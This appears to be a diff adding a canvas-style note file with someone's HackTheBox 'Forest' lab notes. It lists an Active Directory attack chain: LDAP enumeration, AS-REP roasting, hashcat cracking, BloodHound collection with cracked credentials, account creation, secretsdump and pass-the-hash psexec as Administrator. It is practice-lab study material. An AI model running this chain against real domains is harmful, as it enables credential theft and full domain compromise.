@@ -1,0 +1,27 @@
+{
+	"nodes":[
+		{"id":"49516c6a7d075277","x":-240,"y":-40,"width":400,"height":235,"type":"file","file":"forest/attachments/Pasted image 20250204182555.png"},
+		{"id":"f75bad15b2711c10","x":-540,"y":48,"width":250,"height":60,"type":"text","text":"FOREST.htb.local\nhtb.local"},
+		{"id":"d70ce893c84b175e","x":-415,"y":260,"width":1000,"height":140,"type":"text","text":"```\n┌──(kali㉿kali)-[~/HackTheBox/forest]\n└─$ ldapsearch -H ldap://htb.local:389/ -x -s base -b ''  \"(objectClass=*)\" \"*\" + \n```"},
+		{"id":"b15c2828253a7ab8","x":-415,"y":460,"width":1000,"height":112,"type":"text","text":"```\nldapsearch -x -H ldap://htb.local -D 'CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local' -W -b 'DC=htb,DC=local' 'objectClass=user' 'samaccountname'\n```"},
+		{"id":"7779eb4b46c4faee","x":-920,"y":640,"width":250,"height":60,"type":"text","text":"look at LDAP protocol in the nxc docs"},
+		{"id":"8220565f3b4c7284","x":673,"y":484,"width":250,"height":60,"type":"text","text":"https://www.geeksforgeeks.org/ldap-enumeration/"},
+		{"id":"c97f531f31649de6","x":-200,"y":-220,"width":250,"height":60,"type":"text","text":"nmap"},
+		{"id":"38ee0b83513605a8","x":673,"y":572,"width":250,"height":60,"type":"text","text":"https://notes.benheater.com/books/active-directory/page/ldapsearch"},
+		{"id":"55c04213aad80392","x":1520,"y":-220,"width":250,"height":60,"type":"text","text":"445"},
+		{"id":"bf53d5491b0d364c","x":1520,"y":-120,"width":400,"height":306,"type":"file","file":"forest/attachments/Pasted image 20250204211244.png"},
+		{"id":"fe12cce405f5028a","x":1520,"y":320,"width":900,"height":60,"type":"text","text":"asreproast\nimpacket-GetNPUsers -usersfile users_rpcclient -request -format hashcat -outputfile reps -dc-ip htb.local 'htb.local/'\n"},
+		{"id":"7931c1d796f51d6a","x":1520,"y":427,"width":400,"height":235,"type":"file","file":"forest/attachments/Pasted image 20250204211858.png"},
+		{"id":"9d48b9dcd09e3fea","x":1520,"y":740,"width":768,"height":60,"type":"text","text":"hashcat -m 18200 asreproastables.txt /usr/share/wordlists/rockyou.txt"},
+		{"id":"d4483f5841044e6c","x":1520,"y":840,"width":400,"height":234,"type":"file","file":"forest/attachments/Pasted image 20250204212119.png"},
+		{"id":"abda51a54d925b3f","x":1480,"y":1200,"width":1054,"height":60,"type":"text","text":"bloodhound-python -c all -d htb.local -gc htb.local -dc forest.htb.local -ns 10.10.10.161 -u svc-alfresco -p 's3rvice' --disable-autogc --zip"},
+		{"id":"9f8e5edc0a6aad84","x":1480,"y":1340,"width":400,"height":108,"type":"file","file":"forest/attachments/Pasted image 20250204213151.png"},
+		{"id":"1c612acd0563155d","x":1480,"y":1700,"width":400,"height":40,"type":"file","file":"forest/attachments/Pasted image 20250204213334.png"},
+		{"id":"ab7a4ea25d9d9c3f","x":1480,"y":1580,"width":250,"height":60,"type":"text","text":"net user john johnjohn"},
+		{"id":"0393f1467430696d","x":1480,"y":1920,"width":400,"height":173,"type":"file","file":"forest/attachments/Pasted image 20250204213517.png"},
+		{"id":"7becef30f890d3c0","x":1480,"y":1820,"width":570,"height":60,"type":"text","text":"impacket-secretsdump 'htb.local'/'john':'johnjohn'@htb.local"},
+		{"id":"3c06baf2a6b0efbe","x":1480,"y":2240,"width":400,"height":188,"type":"file","file":"forest/attachments/Pasted image 20250204213729.png"},
+		{"id":"f2e9ad02ba99a1f2","x":1480,"y":2140,"width":1106,"height":60,"type":"text","text":"impacket-psexec htb.local/Administrator@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6"}
+	],
+	"edges":[]
+}
